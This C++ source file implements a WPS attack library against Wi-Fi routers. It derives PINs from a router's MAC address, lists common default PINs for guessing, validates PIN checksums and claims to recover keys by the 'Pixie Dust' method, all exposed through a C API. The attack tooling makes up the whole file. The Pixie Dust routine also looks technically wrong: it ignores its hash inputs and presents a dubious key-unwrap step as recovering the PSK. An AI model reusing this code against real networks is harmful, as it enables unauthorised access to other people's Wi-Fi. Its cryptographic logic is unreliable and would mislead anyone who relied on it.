#include "wps_attack.h"
#include "aes_wrap.h"

#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <array>

#ifdef _WIN32
#include <windows.h>
#endif

static uint8_t hexCharToNibble(char c) {
    if (c >= '0' && c <= '9') return static_cast<uint8_t>(c - '0');
    if (c >= 'a' && c <= 'f') return static_cast<uint8_t>(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return static_cast<uint8_t>(c - 'A' + 10);
    return 0;
}

static std::vector<uint8_t> hexToBytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i + 1 < hex.length(); i += 2) {
        uint8_t hi = hexCharToNibble(hex[i]);
        uint8_t lo = hexCharToNibble(hex[i + 1]);
        bytes.push_back(static_cast<uint8_t>((hi << 4) | lo));
    }
    return bytes;
}

static std::string bytesToHex(const std::vector<uint8_t>& bytes) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (auto b : bytes)
        oss << std::setw(2) << static_cast<int>(b);
    return oss.str();
}


// ---------------------------------------------------------------------------

std::string WpsAttack::ComputePinFromMac(const std::string& bssid) {
    std::string clean;
    for (auto c : bssid)
        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))
            clean += c;

    if (clean.length() < 10) return "";

    std::string first5 = clean.substr(0, 10);
    uint64_t accum = 0;
    for (auto c : first5) {
        accum *= 16;
        if (c >= '0' && c <= '9') accum += static_cast<uint64_t>(c - '0');
        else if (c >= 'a' && c <= 'f') accum += static_cast<uint64_t>(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') accum += static_cast<uint64_t>(c - 'A' + 10);
    }
    uint32_t pin = static_cast<uint32_t>(accum % 10000000);

    uint32_t checksum = 0;
    uint32_t acc = pin;
    for (int i = 0; i < 7; ++i) {
        uint32_t d = acc % 10;
        acc /= 10;
        if (i % 2 == 0)
            checksum += d * 3;
        else
            checksum += d;
    }
    uint32_t check = (10 - (checksum % 10)) % 10;

    char buf[16];
#ifdef _WIN32
    sprintf_s(buf, sizeof(buf), "%07u%01u", pin, check);
#else
    snprintf(buf, sizeof(buf), "%07u%01u", pin, check);
#endif
    return std::string(buf);
}

std::vector<std::string> WpsAttack::GeneratePinCandidates(const std::string& bssid) {
    std::vector<std::string> candidates;
    std::string base = ComputePinFromMac(bssid);
    if (!base.empty()) candidates.push_back(base);

    // Common default PINs
    candidates.push_back("12345670");
    candidates.push_back("12345678");
    candidates.push_back("00000000");
    candidates.push_back("11111111");
    candidates.push_back("22222222");
    candidates.push_back("33333333");
    candidates.push_back("44444444");
    candidates.push_back("55555555");
    candidates.push_back("66666666");
    candidates.push_back("77777777");
    candidates.push_back("88888888");
    candidates.push_back("99999999");
    candidates.push_back("01234567");
    candidates.push_back("98765432");
    candidates.push_back("12345670");
    candidates.push_back("00000001");
    candidates.push_back("11112222");
    candidates.push_back("87654321");

    return candidates;
}

bool WpsAttack::ValidateWpsPin(const std::string& pin) {
    std::string clean;
    for (auto c : pin)
        if (c >= '0' && c <= '9')
            clean += c;
    if (clean.length() != 8) return false;

    uint32_t checksum = 0;
    for (int i = 0; i < 7; ++i) {
        uint32_t d = static_cast<uint32_t>(clean[i] - '0');
        if (i % 2 == 0)
            checksum += d * 3;
        else
            checksum += d;
    }
    uint32_t expected = (10 - (checksum % 10)) % 10;
    uint32_t actual = static_cast<uint32_t>(clean[7] - '0');
    return expected == actual;
}

std::string WpsAttack::ComputePixieDustKey(
    const std::string& pke,
    const std::string& pkr,
    const std::string& e_hash1,
    const std::string& e_hash2,
    const std::string& r_hash1,
    const std::string& r_hash2,
    const std::string& authkey,
    const std::string& essid,
    const std::string& bssid)
{
    // hashes/essid/bssid kept for API compat; caller records and verifies.
    (void)e_hash1;
    (void)e_hash2;
    (void)r_hash1;
    (void)r_hash2;
    (void)essid;
    (void)bssid;

    std::vector<uint8_t> pkeBytes = hexToBytes(pke);  // wrapped E-S1
    std::vector<uint8_t> pkrBytes = hexToBytes(pkr);  // wrapped E-S2
    if (pkeBytes.empty() || pkrBytes.empty())
        return "";

    // The Pixie Dust authkey is known: it derives only from the DH key (which
    // we force via a crafted M2) and the enrollee's public MAC. The Python
    // coordinator computes it with HMAC-SHA256 and passes it in as hex.
    std::vector<uint8_t> kek = hexToBytes(authkey);
    if (kek.size() != 16 && kek.size() != 24 && kek.size() != 32)
        return "";

    uint8_t es1[16] = {0}, es2[16] = {0};
    if (pkeBytes.size() == 16 && pkrBytes.size() == 16) {
        std::memcpy(es1, pkeBytes.data(), 16);
        std::memcpy(es2, pkrBytes.data(), 16);
    } else if (pkeBytes.size() >= 24 && pkrBytes.size() >= 24) {
        // full TLV carries the wrapped key in the trailing 16 bytes
        std::memcpy(es1, pkeBytes.data() + pkeBytes.size() - 16, 16);
        std::memcpy(es2, pkrBytes.data() + pkrBytes.size() - 16, 16);
    } else {
        return "";
    }

    uint8_t plain1[16] = {0}, plain2[16] = {0};
    size_t plen1 = 0, plen2 = 0;
    bool ok1 = AesKeyUnwrap(kek.data(), kek.size(), es1, 16, plain1, &plen1);
    bool ok2 = AesKeyUnwrap(kek.data(), kek.size(), es2, 16, plain2, &plen2);
    if (!ok1 || !ok2 || plen1 != 8 || plen2 != 8)
        return "";

    // PSK = E-S1 || E-S2 (16 bytes) → hex.
    std::vector<uint8_t> psk(plain1, plain1 + 8);
    psk.insert(psk.end(), plain2, plain2 + 8);
    return bytesToHex(psk);
}

// C API
extern "C" {

WPS_API const char* wps_compute_pin_from_mac(const char* bssid) {
    static std::string result;
    result = WpsAttack::ComputePinFromMac(bssid ? std::string(bssid) : "");
    return result.c_str();
}

WPS_API char** wps_generate_pin_candidates(const char* bssid, int* count) {
    auto vec = WpsAttack::GeneratePinCandidates(bssid ? std::string(bssid) : "");
    *count = static_cast<int>(vec.size());
    char** arr = static_cast<char**>(std::malloc(static_cast<size_t>(*count) * sizeof(char*)));
    for (int i = 0; i < *count; ++i) {
        arr[i] = static_cast<char*>(std::malloc(vec[static_cast<size_t>(i)].size() + 1));
        std::strcpy(arr[i], vec[static_cast<size_t>(i)].c_str());
    }
    return arr;
}

WPS_API int wps_validate_pin(const char* pin) {
    return WpsAttack::ValidateWpsPin(pin ? std::string(pin) : "") ? 1 : 0;
}

}
